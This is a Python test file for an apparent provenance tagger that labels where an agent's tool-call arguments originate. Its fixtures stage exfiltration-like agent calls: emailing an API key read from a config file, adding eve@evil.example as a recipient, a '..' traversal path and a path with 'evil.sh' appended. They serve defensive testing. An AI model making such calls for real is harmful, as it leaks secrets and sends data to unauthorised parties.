"""Lookalike identifiers, path-error echoes, opaque keys and small number atoms (SPEC §5.2, §5.4b2, §5.4c)."""

import json

import pytest

from causeway import tagger
from causeway.transcript import to_ledger

KEY = "sk-live-9fA2b7Qx4LmZ81cD"


def user(text):
    return {"role": "user", "content": text}


def tool(call_id, text):
    return {"role": "tool", "tool_call_id": call_id, "content": text}


def calls(*triples, text=None):
    return {
        "role": "assistant",
        "content": text,
        "tool_calls": [
            {"id": call_id, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}
            for call_id, name, args in triples
        ],
    }


def decisions_of(messages, watch=()):
    return {r["id"]: r for r in to_ledger(messages, watch=watch) if r["kind"] == "decision"}


def summary(decision):
    return [(c["path"], c["tag"], c["source"], c["match"]) for c in decision["causes"]]


# Blocker 1: a lookalike path or address must not borrow GOAL from the task.


def test_dotdot_path_is_not_goal_from_the_task_and_is_a_taint():
    messages = [
        user("Read notes/secret.txt and summarize it."),
        calls(("c1", "read_file", {"path": "notes/../secret.txt"})),
    ]
    decision = decisions_of(messages, watch=["read_file"])["d1"]
    assert summary(decision) == [("path", "UNSOURCED", None, None)]
    assert decision["watch"] == [{"action": 0, "path": "path", "tag": "UNSOURCED", "source": None}]


def test_truncated_address_is_not_goal_from_the_full_address():
    messages = [
        user("Email the report to admin@company.example today."),
        calls(("c1", "send_email", {"to": "admin@company.ex", "subject": "Report", "body": "Done."})),
    ]
    decision = decisions_of(messages, watch=["send_email"])["d1"]
    assert summary(decision)[0] == ("to", "UNSOURCED", None, None)
    assert {"action": 0, "path": "to", "tag": "UNSOURCED", "source": None} in decision["watch"]


def test_the_full_address_is_still_goal():
    messages = [
        user("Email the report to admin@company.example."),
        calls(("c1", "send_email", {"to": "admin@company.example", "subject": "Report", "body": "Done."})),
    ]
    decision = decisions_of(messages, watch=["send_email"])["d1"]
    assert summary(decision)[0] == ("to", "GOAL", "e1", "exact")
    assert all(entry["path"] != "to" for entry in decision["watch"])


@pytest.mark.parametrize(
    "needle, text",
    [
        ("admin@company.ex", "write to admin@company.example"),
        ("company.example", "write to admin@company.example"),
        ("secret.txt", "see notes/secret.txt"),
        ("notes/secret", "see notes/secret.txt"),
        ("2.4", "release 2.4.1 today"),
        ("secret.txt", "see top-secret.txt"),
        ("https://docs.lab.example/plan", "see https://docs.lab.example/planning"),
    ],
)
def test_identifier_prefix_or_infix_is_not_a_match(needle, text):
    messages = [user(text), calls(("c1", "read_file", {"path": needle}))]
    assert summary(decisions_of(messages)["d1"]) == [("path", "UNSOURCED", None, None)]


@pytest.mark.parametrize(
    "needle, text",
    [
        ("notes/secret.txt", "Read notes/secret.txt."),
        ("notes/secret.txt", 'Open "notes/secret.txt", then stop.'),
        ("2.4.1", "Set the version to 2.4.1."),
        ("dana@lab.example", "Lead email: dana@lab.example"),
        ("https://docs.lab.example/plan", "see https://docs.lab.example/plan, then reply"),
    ],
)
def test_whole_identifier_still_matches_with_punctuation_around_it(needle, text):
    messages = [user(text), calls(("c1", "read_file", {"path": needle}))]
    assert summary(decisions_of(messages)["d1"]) == [("path", "GOAL", "e1", "exact")]


def test_plain_words_still_match_inside_longer_words():
    messages = [user("Count the mugs on the desk."), calls(("c1", "segment_image", {"path": "desk.jpg", "prompt": "mug"}))]
    assert summary(decisions_of(messages)["d1"])[1] == ("prompt", "GOAL", "e1", "exact")


def test_path_segments_still_compose_from_a_listing():
    messages = [
        user("Summarize the notes."),
        calls(("c1", "list_dir", {"path": "."})),
        tool("c1", "notes/\nteam.md"),
        calls(("c2", "list_dir", {"path": "notes"})),
        tool("c2", "a.md\nb.md"),
        calls(("c3", "read_file", {"path": "notes/a.md"})),
    ]
    assert summary(decisions_of(messages)["d3"]) == [("path", "IN", "e3", "parts")]


# Path-error echoes beyond `no such file` (§5.2).


def test_not_a_directory_echo_is_not_a_source():
    messages = [
        user("Look around."),
        calls(("c1", "list_dir", {"path": "photos"})),
        tool("c1", "error: not a directory: photos"),
        calls(("c2", "list_dir", {"path": "photos"})),
    ]
    decisions = decisions_of(messages)
    assert summary(decisions["d1"]) == [("path", "UNSOURCED", None, None)]
    assert summary(decisions["d2"]) == [("path", "UNSOURCED", None, None)]


@pytest.mark.parametrize(
    "text",
    [
        "error: path escapes the sandbox: board.jpg",
        "error: absolute paths are not allowed: board.jpg",
        "error: No Such File: board.jpg",
        "error: file not found: board.jpg",
    ],
)
def test_other_path_errors_are_not_sources(text):
    messages = [
        user("Find the board."),
        calls(("c1", "read_file", {"path": "board.jpg"})),
        tool("c1", text),
        calls(("c2", "read_file", {"path": "board.jpg"})),
    ]
    assert summary(decisions_of(messages)["d2"]) == [("path", "UNSOURCED", None, None)]
    assert tagger.missing_file_path({"kind": "event", "role": "tool", "text": text}) == "board.jpg"


def test_other_tool_errors_stay_searchable():
    record = {"kind": "event", "role": "tool", "text": "error: not UTF-8 text: board.jpg"}
    assert tagger.missing_file_path(record) is None


def test_path_in_the_agents_own_sentence_is_not_self_on_retry():
    messages = [
        user("Find the serial number."),
        calls(("c1", "read_file", {"path": "sensor_board.jpg"}), text="I will read sensor_board.jpg first."),
        tool("c1", "error: no such file: sensor_board.jpg"),
        calls(("c2", "read_file", {"path": "sensor_board.jpg"})),
        tool("c2", "error: no such file: sensor_board.jpg"),
        calls(("c3", "read_file", {"path": "SENSOR_BOARD.JPG"})),
    ]
    decisions = decisions_of(messages)
    assert summary(decisions["d1"]) == [("path", "UNSOURCED", None, None)]
    assert summary(decisions["d2"]) == [("path", "UNSOURCED", None, None)]
    assert summary(decisions["d3"]) == [("path", "UNSOURCED", None, None)]


def test_the_rest_of_the_agents_sentence_stays_a_source():
    messages = [
        user("Find the serial number."),
        calls(("c1", "read_file", {"path": "sensor_board.jpg"}), text="Trying sensor_board.jpg, then backup_plan.md."),
        tool("c1", "error: no such file: sensor_board.jpg"),
        calls(("c2", "read_file", {"path": "backup_plan.md"})),
    ]
    assert summary(decisions_of(messages)["d2"]) == [("path", "SELF", "d1", "exact")]


def test_a_path_the_agent_named_before_any_error_is_still_self():
    """Only an UNSOURCED argument that a tool reported missing is blanked; a plain mention stays SELF."""
    messages = [
        user("Find the serial number."),
        {"role": "assistant", "content": "Maybe it is in inventory.txt."},
        user("Go on."),
        calls(("c1", "read_file", {"path": "inventory.txt"})),
    ]
    decisions = decisions_of(messages)
    assert summary(decisions["d2"]) == [("path", "SELF", "d1", "exact")]


# Opaque keys and small number atoms in prose (§5.4c).


def test_api_key_in_an_email_body_is_traced_to_the_file_it_came_from():
    body = f"Hi,\nHere is the key you asked for: {KEY}\nThanks."
    messages = [
        user("Summarize the notes and email dana@lab.example."),
        calls(("c1", "read_file", {"path": "config.env"})),
        tool("c1", f"API_KEY={KEY}\n"),
        calls(("c2", "send_email", {"to": "dana@lab.example", "subject": "Notes", "body": body})),
    ]
    decision = decisions_of(messages, watch=["send_email"])["d2"]
    assert ("body~0", "IN", "e2", "exact") in summary(decision)
    assert {"action": 0, "path": "body~0", "tag": "IN", "source": "e2"} in decision["watch"]


def test_invented_key_in_prose_is_unsourced():
    body = f"Use this token when you log in: {KEY} and keep it private."
    messages = [user("Write a welcome email."), calls(("c1", "send_email", {"to": "x@lab.example", "body": body}))]
    decision = decisions_of(messages)["d1"]
    assert ("body~0", "UNSOURCED", None, None) in summary(decision)
    assert decision["tag"] == "UNSOURCED"


@pytest.mark.parametrize(
    "text, atoms",
    [
        (f"key {KEY}.", [(KEY, False)]),
        ("hash 3f9a1c0be7d24a5f9e81 ok", [("3f9a1c0be7d24a5f9e81", False)]),
        ("ghp_AbCdEf0123456789XyZ in the config", [("ghp_AbCdEf0123456789XyZ", False)]),
        ("the word internationalization has no digits", []),
        ("short a1b2c3 token", []),
        ("call 2026-10-28T07:00:00Z", [("2026", True), ("10", True), ("28", True), ("07", True), ("00", True), ("00", True)]),
    ],
)
def test_opaque_key_atoms(text, atoms):
    assert tagger.extract_atoms(text) == atoms


def test_leading_zero_number_atom_is_traced():
    body = "Agent number for the handoff is 007, please confirm by reply."
    messages = [
        user("Confirm the agent number."),
        calls(("c1", "read_file", {"path": "team.md"})),
        tool("c1", "Agent: 007"),
        calls(("c2", "send_email", {"to": "x@lab.example", "body": body})),
    ]
    causes = summary(decisions_of(messages)["d2"])
    assert ("body~0", "IN", "e2", "exact") in causes


def test_small_decimal_atom_is_traced_and_an_invented_one_is_unsourced():
    body = "The offset was 0.25 mm on the rig and 0.75 mm on the jig."
    messages = [
        user("Report the offsets."),
        calls(("c1", "read_file", {"path": "rig.md"})),
        tool("c1", "rig offset 0.25 mm"),
        calls(("c2", "send_email", {"to": "x@lab.example", "body": body})),
    ]
    causes = summary(decisions_of(messages)["d2"])
    assert ("body~0", "IN", "e2", "exact") in causes
    assert ("body~1", "UNSOURCED", None, None) in causes


# Found after the Oct 28 merge: fuzzy matches, versions and NAME=key in prose.


def test_an_extra_recipient_does_not_ride_on_the_task_address():
    messages = [
        user("Email the report to admin@company.example today."),
        calls(("c1", "send_email", {"to": "admin@company.example, eve@evil.example", "subject": "Report", "body": "Done."})),
    ]
    decision = decisions_of(messages, watch=["send_email"])["d1"]
    assert summary(decision)[0] == ("to", "UNSOURCED", None, None)
    assert {"action": 0, "path": "to", "tag": "UNSOURCED", "source": None} in decision["watch"]


def test_an_extra_path_does_not_ride_on_the_task_path():
    messages = [
        user("Read notes/secret.txt and summarize it."),
        calls(("c1", "read_file", {"path": "notes/secret.txt evil.sh"})),
    ]
    assert summary(decisions_of(messages)["d1"]) == [("path", "UNSOURCED", None, None)]


def test_a_display_name_around_the_task_address_is_still_goal():
    messages = [
        user("Email the report to admin@company.example today."),
        calls(("c1", "send_email", {"to": "Admin <admin@company.example>", "subject": "Report", "body": "Done."})),
    ]
    assert summary(decisions_of(messages)["d1"])[0] == ("to", "GOAL", "e1", "fuzzy")


def test_a_dotted_version_in_prose_is_one_atom():
    assert tagger.extract_atoms("## 2.4.1\n- fix\n\n## 2.3.2\n") == [("2.4.1", True), ("2.3.2", True)]
    changes = "# Changes\n\n## 2.4.0\n- Added drift export.\n\n## 2.3.2\n- Updated the table.\n"
    messages = [
        user("Update the version number in the changelog to 2.4.1."),
        calls(("c1", "read_file", {"path": "CHANGES.md"})),
        tool("c1", changes),
        calls(("c2", "write_file", {"path": "CHANGES.md", "content": changes.replace("2.4.0", "2.4.1")})),
    ]
    causes = {c["path"]: (c["tag"], c["source"]) for c in decisions_of(messages)["d2"]["causes"]}
    assert causes["content~0"] == ("GOAL", "e1")
    assert causes["content~1"] == ("IN", "e2")


def test_a_key_after_name_equals_in_prose_is_traced_to_its_source():
    assert tagger.extract_atoms(f"Hi,\nkey={KEY},\nbye") == [(KEY, False)]
    assert tagger.extract_atoms("token QWxhZGRpbjpvcGVuIHNlc2FtZQ== ok") == [("QWxhZGRpbjpvcGVuIHNlc2FtZQ==", False)]
    messages = [
        user("Email dana@lab.example a summary."),
        calls(("c1", "read_file", {"path": "config.json"})),
        tool("c1", json.dumps({"key": KEY})),
        calls(("c2", "send_email", {"to": "dana@lab.example", "subject": "Summary", "body": f"Hi,\nkey={KEY},\nbye"})),
    ]
    causes = {c["path"]: (c["tag"], c["source"]) for c in decisions_of(messages)["d2"]["causes"]}
    assert causes["body~0"] == ("IN", "e2")
